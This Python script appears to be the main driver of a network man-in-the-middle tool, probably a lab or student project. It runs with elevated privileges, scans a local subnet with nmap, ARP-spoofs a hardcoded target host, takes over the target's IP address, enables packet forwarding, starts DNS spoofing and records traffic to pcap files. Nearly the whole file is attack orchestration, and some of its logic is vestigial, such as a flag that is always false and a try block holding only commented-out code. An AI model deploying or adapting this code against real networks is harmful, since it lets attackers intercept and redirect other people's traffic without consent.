#Import List
import ipaddress
import nmap
import sys
import admin
import os
from threading import Thread
import scapy.all as scapy
import multiprocessing

import ARP_Spoofing
import Change_IP_Address
import Network_Discovery
import DNS_Spoofing
import Traffic_Forwarder

def Main():
    #IP = NetFunctions.get_ip()

    #ARGV implementation for final revision
    #if sys.argv.len() <= 1:
    #    print("invalid IP Address")
    #    sys.exit()

    IP = '192.168.42.129' #predifined variable values for testing purposes
    Mac = Network_Discovery.get_mac_by_ip_SELF(IP)
    MASK = "255.255.255.0"
    Target = "192.168.42.130"
    TargetMac = Network_Discovery.get_mac_by_ip(Target, IP)
    Interface = Network_Discovery.get_interface_from_ip(IP)

    if len(IP.split(".")) != 4:
        print("IP Address invalid, check format")
        sys.exit()

    for num in IP.split("."):
        if (not (num.isnumeric()) or int(num) > 255 or int(num) <= -1):
            print("IP Address invalid, check format")
            sys.exit()

    if not Interface:
        print("Interface invalid, check IP Address")
        sys.exit()

    host = ipaddress.IPv4Address(IP)
    net = ipaddress.IPv4Network(IP + '/' + MASK, False)
    #gw = scapy.conf.route.route("0.0.0.0")[2]

    #starts new thread to run the function that gathers the Network traffic
    t1 = multiprocessing.Process(target=Network_Discovery.NetCap, args=("test.pcap", Network_Discovery.get_interface_from_ip(IP)))
    t1.start()

    try:
       print("Starting Network Host Scan")
       nm = nmap.PortScanner()
       nm.scan(str(net.network_address) + "/24", '1')
       print(nm.all_hosts())
    except KeyboardInterrupt:
       sys.exit()
    except Exception as e: 
       print(f"Network scan failed: {e}")

    print(f"Starting ARP attack against: {Target}")

    IfIPChange=False

    if Target in nm.all_hosts():
        t2 = multiprocessing.Process(target=ARP_Spoofing.spoof, args=(Target, IP, TargetMac, Mac))
        t2.start()

        if(IfIPChange==False):
            try:
                print("Attempting to change IP Address")
                t2.terminate()
                t1.terminate()

                Change_IP_Address.changeIPAddress(Interface, Target, MASK)
                IfIPChange=True

                t2 = multiprocessing.Process(target=ARP_Spoofing.spoof, args=(Target, IP, TargetMac, Mac))
                t2.start()

                t1 = multiprocessing.Process(target=Network_Discovery.NetCap, args=("test1.pcap", Network_Discovery.get_interface_from_ip(IP)))
                t1.start()

                print("IP Address successfully Changed")

            except Exception as e:
                print(f"IP Address change failed {e}")
                Change_IP_Address.changeIPAddress(Interface, IP, MASK)
                t2 = multiprocessing.Process(target=ARP_Spoofing.spoof, args=(Target, IP, TargetMac, Mac))
                t2.start()

                t1 = multiprocessing.Process(target=Network_Discovery.NetCap, args=("test1.pcap", Network_Discovery.get_interface_from_ip(IP)))
                t1.start()
                IfIPChange=False

        if (os.name != 'nt'):
            ARP_Spoofing.enable_ip_forwarding()

        DNS_Spoofing.start_sniffing("8.8.8.8", Interface)

        try:
            True
            # scapy.sniff(filter=f"ip.dst == {host}", 
            # prn=lambda packet: Traffic_Forwarder.Host(packet, Interface),
            # iface=Interface)

            # scapy.sniff(filter=f"ip.dst == {Target}", 
            # prn=lambda packet: Traffic_Forwarder.Target(packet, Interface),
            # iface=Interface)

        except KeyboardInterrupt: #closes on keyboard interupt
            print("Keyboard Interupt")
            ARP_Spoofing.spoof(IP, Target, Mac, TargetMac)
            Change_IP_Address.changeIPAddress(Interface, IP, MASK)
            ARP_Spoofing.disable_ip_forwarding()
            t2.join()
            t1.join()
            sys.exit()
        except Exception as e: #closes on exception
            print(f"Arp spoofing failed: {e}")
            ARP_Spoofing.spoof(IP, Target, Mac, TargetMac)
            Change_IP_Address.changeIPAddress(Interface, IP, MASK)
            ARP_Spoofing.disable_ip_forwarding()
            t2.join()
            t1.join()
            sys.exit()

if __name__ == "__main__": #runs main program and checks for admin privileges
    if not admin.isUserAdmin():
        admin.runAsAdmin()
        print("Requesting Admin privileges")

    else:
        print("Successfully elevated")
        Main()